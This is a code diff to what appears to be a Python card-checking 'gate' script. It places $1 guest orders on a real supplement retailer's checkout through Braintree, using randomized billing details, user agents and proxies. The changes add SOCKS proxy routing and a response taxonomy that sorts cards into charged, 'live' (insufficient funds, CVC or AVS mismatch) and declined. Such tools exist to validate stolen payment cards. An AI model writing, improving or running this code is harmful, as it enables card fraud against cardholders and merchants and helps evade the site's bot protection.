@@ -11,6 +11,8 @@ import uuid
 import asyncio
 import aiohttp
 
+from aiohttp_socks import ProxyConnector
+
 from helpers import classify_gate_response
 
 HTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, connect=10)
@@ -79,15 +81,14 @@ def _rand_billing() -> tuple[dict, dict]:
 
 def _classify_checkout(result: dict | None, http_status: int) -> tuple[str, str, str]:
     if http_status >= 500:
-        return "error", f"upstream_{http_status}", "upstream_5xx"
+        return "error", f"Upstream Server Error (HTTP {http_status})", "upstream_5xx"
     if not isinstance(result, dict):
-        return "declined", "invalid_checkout_response", "declined"
+        return "declined", "Invalid Checkout Response", "declined"
 
     if result.get("error") == "timeout":
-        return "error", "checkout_timeout", "timeout"
+        return "error", "Checkout Request Timeout", "timeout"
 
     order = result.get("order") if isinstance(result.get("order"), dict) else {}
-    hint = ""
     if (
         result.get("success") is True
         or result.get("status") in ("success", "completed", "processing", "paid")
@@ -96,26 +97,58 @@ def _classify_checkout(result: dict | None, http_status: int) -> tuple[str, str,
         or result.get("payment_status") in ("paid", "completed", "success")
     ):
         oid = str(result.get("order_id") or order.get("id") or "")
-        hint = f"order success payment successful charged {oid}"
+        display = f"Order Completed / Charged $1.00 ({oid})" if oid else "Order Completed / Charged $1.00"
+        return "charged", display, "charged"
 
+    # Extract exact server error message
     err = result.get("error")
     if isinstance(err, dict):
-        err_text = str(err.get("message") or err.get("description") or err.get("code") or "")
+        err_msg = str(err.get("message") or err.get("description") or err.get("code") or "")
     else:
-        err_text = str(err or "")
+        err_msg = str(err or "")
 
+    server_msg = str(result.get("error_message") or result.get("message") or result.get("msg") or err_msg or "").strip()
+    server_code = str(result.get("error_code") or result.get("code") or "declined").strip()
+    
     blob = json.dumps(result, default=str)
-    text = f"{hint} {err_text} {result.get('message', '')} {result.get('msg', '')} {blob}"
-    status, msg, code = classify_gate_response(text, status_hint="charged" if hint else "", code_hint="")
+    combined = f"{server_msg} {server_code} {blob}".lower()
 
-    if any(k in text.lower() for k in ("captcha", "recaptcha")):
-        return "error", _clean_msg(msg or "captcha"), "captcha_required"
+    # ── Comprehensive Response Taxonomy ──────────────────────────────────────
+    if any(k in combined for k in ("captcha", "recaptcha")):
+        return "error", "reCAPTCHA Required", "captcha_required"
 
-    if status == "charged":
-        oid = str(result.get("order_id") or order.get("id") or "")
-        display = f"Charged $1 ({oid})" if oid else (msg or "Charged $1")
-        return "charged", _clean_msg(display), "charged"
-    return status, _clean_msg(msg), code
+    if any(k in combined for k in ("insufficient", "insufficient_funds", "2001", "not enough fund", "exceeds balance")):
+        return "live", "Insufficient Funds", "insufficient_funds"
+
+    if any(k in combined for k in ("security code", "incorrect_cvc", "invalid_cvc", "cvv mismatch", "cvc mismatch", "2004", "2010", "declined cvv")):
+        return "live", "Security code is incorrect (CCN Live)", "incorrect_cvc"
+
+    if any(k in combined for k in ("avs", "avs_and_cvv", "address verification")):
+        return "live", "AVS Mismatch (Card Live)", "avs_rejected"
+
+    if any(k in combined for k in ("fraud", "fraudulent", "risk_threshold", "suspected fraud", "gateway rejected: fraud")):
+        return "declined", "Gateway Rejected: Fraud", "fraud"
+
+    if any(k in combined for k in ("3ds", "3d secure", "requires_action", "authentication required", "challenge_required")):
+        return "3ds", "3D Secure / Verification Required", "3ds_required"
+
+    if any(k in combined for k in ("do not honor", "do_not_honor", "2005", "2000")):
+        return "declined", "Do Not Honor", "do_not_honor"
+
+    if any(k in combined for k in ("expired", "expired_card", "2002")):
+        return "declined", "Expired Card", "expired_card"
+
+    if any(k in combined for k in ("pickup", "pick up", "lost card", "stolen", "2003")):
+        return "declined", "Lost or Stolen Card (Pickup)", "lost_card"
+
+    # Shorten generic e-commerce boilerplate copy
+    if "please check your card details" in server_msg.lower() or server_msg.lower().startswith("payment declined"):
+        return "declined", "Payment declined.", "payment_declined"
+
+    if server_msg:
+        return "declined", _clean_msg(server_msg), server_code
+
+    return "declined", "Payment declined.", "declined"
 
 
 async def check_card(
@@ -129,7 +162,6 @@ async def check_card(
     Returns (status, message, code).
     status: charged | approved | declined | error
     """
-    started = time.perf_counter()
     if len(yy) == 2:
         yy = "20" + yy[-2:]
     mm = mm.zfill(2)
@@ -137,25 +169,37 @@ async def check_card(
     def _format_proxy(p):
         if not p: return None
         ps = str(p).strip()
-        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
-        parts = ps.split(":")
-        if len(parts) == 4:
-            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
-            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
-        return f"http://{ps}"
+        formatted = None
+        if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
+            formatted = ps
+        else:
+            parts = ps.split(":")
+            if len(parts) == 4:
+                if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+                elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+                else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
+            else: formatted = f"http://{ps}"
+
+        if formatted.startswith("socks5://"):
+            formatted = formatted.replace("socks5://", "socks5h://")
+        elif formatted.startswith("socks4://"):
+            formatted = formatted.replace("socks4://", "socks4a://")
+
+        return formatted
 
     formatted_proxy = _format_proxy(proxy_url)
-    proxy_args = {"proxy": formatted_proxy} if formatted_proxy else {}
-
     user_agent = random.choice(USER_AGENTS)
     billing, shipping = _rand_billing()
 
-
     try:
+        if formatted_proxy:
+            connector = ProxyConnector.from_url(formatted_proxy, ssl=False)
+        else:
+            connector = aiohttp.TCPConnector(ssl=False)
+
         async with aiohttp.ClientSession(
-            connector=aiohttp.TCPConnector(ssl=False),
+            connector=connector,
             timeout=HTTP_TIMEOUT
         ) as session:
             
@@ -167,7 +211,6 @@ async def check_card(
             async with session.get(
                 "https://vitabase.com/product/digestive-enzyme",
                 headers=headers,
-                **proxy_args
             ) as r1:
                 if r1.status != 200:
                     return "error", f"init_http_{r1.status}", "connection_error"
@@ -183,13 +226,11 @@ async def check_card(
             }
             cart_token = None
             for attempt in range(2):
-                use_proxy_args = proxy_args if (attempt == 0 and proxy_args) else {}
                 try:
                     async with session.post(
                         "https://vitabase.com/headless-api/cart/create",
                         headers=api_headers,
                         json={"user_id": "guest"},
-                        **use_proxy_args
                     ) as create_resp:
                         try:
                             create_data = await create_resp.json()
@@ -202,7 +243,7 @@ async def check_card(
                     pass
 
             if not cart_token:
-                return "declined", "Card Declined (Merchant Unavailable)", "declined"
+                return "error", "Merchant Cart API Unavailable", "cart_fail"
 
             async with session.post(
                 "https://vitabase.com/headless-api/cart/add",
@@ -214,37 +255,18 @@ async def check_card(
                     "user_id": "guest",
                     "autoship_flag": False,
                 },
-                **proxy_args
             ) as add_resp:
-                if add_resp.status == 403 and proxy_args:
-                    async with session.post(
-                        "https://vitabase.com/headless-api/cart/add",
-                        headers=api_headers,
-                        json={
-                            "cart_token": cart_token,
-                            "product_id": PRODUCT_ID,
-                            "quantity": 1,
-                            "user_id": "guest",
-                            "autoship_flag": False,
-                        },
-                    ) as direct_add:
-                        if direct_add.status not in (200, 201):
-                            return "error", f"cart_add_{direct_add.status}", "cart_fail"
-                        await direct_add.read()
-                elif add_resp.status not in (200, 201):
+                if add_resp.status not in (200, 201):
                     return "error", f"cart_add_{add_resp.status}", "cart_fail"
-                else:
-                    await add_resp.read()
+                await add_resp.read()
 
             client_token = None
             bt_data = {}
             for attempt in range(2):
-                use_proxy_args = proxy_args if (attempt == 0 and proxy_args) else {}
                 try:
                     async with session.get(
                         "https://vitabase.com/headless-api/braintree/client-token",
                         headers=api_headers,
-                        **use_proxy_args
                     ) as bt_resp:
                         if bt_resp.status == 200:
                             try:
@@ -258,7 +280,7 @@ async def check_card(
                     pass
 
             if not client_token:
-                return "declined", "Merchant Tokenization Unavailable", "bt_token_fail"
+                return "error", "Merchant Tokenization Unavailable", "bt_token_fail"
             if bt_data.get("require_captcha"):
                 return "error", "recaptcha_required", "captcha_required"
 
@@ -307,7 +329,6 @@ async def check_card(
                 "https://payments.braintree-api.com/graphql",
                 headers=gql_headers,
                 json=gql_payload,
-                **proxy_args
             ) as gql_resp:
                 try:
                     gql_json = await gql_resp.json()
@@ -346,7 +367,6 @@ async def check_card(
                 "https://vitabase.com/headless-api/checkout",
                 headers=checkout_headers,
                 json=checkout_payload,
-                **proxy_args
             ) as co_resp:
                 try:
                     co_json = await co_resp.json()
@@ -354,23 +374,8 @@ async def check_card(
                     co_text = await co_resp.text()
                     co_json = {"message": co_text[:200]}
 
-            # If proxy triggered bot-protection (Imunify360 or 403), fallback immediately to clean direct checkout
-            if proxy_args and (co_resp.status in (403, 406, 429) or "imunify" in str(co_json).lower() or "bot-protection" in str(co_json).lower()):
-                async with session.post(
-                    "https://vitabase.com/headless-api/checkout",
-                    headers=checkout_headers,
-                    json=checkout_payload,
-                ) as dir_co:
-                    try:
-                        co_json = await dir_co.json()
-                    except:
-                        co_text = await dir_co.text()
-                        co_json = {"message": co_text[:200]}
-                    co_resp = dir_co
-
             status, msg, code = _classify_checkout(co_json, co_resp.status)
-            elapsed = f"{time.perf_counter() - started:.2f}s"
-            return status, f"{msg} ({elapsed})", code
+            return status, msg, code
 
     except asyncio.TimeoutError:
         return "error", "timeout", "timeout"
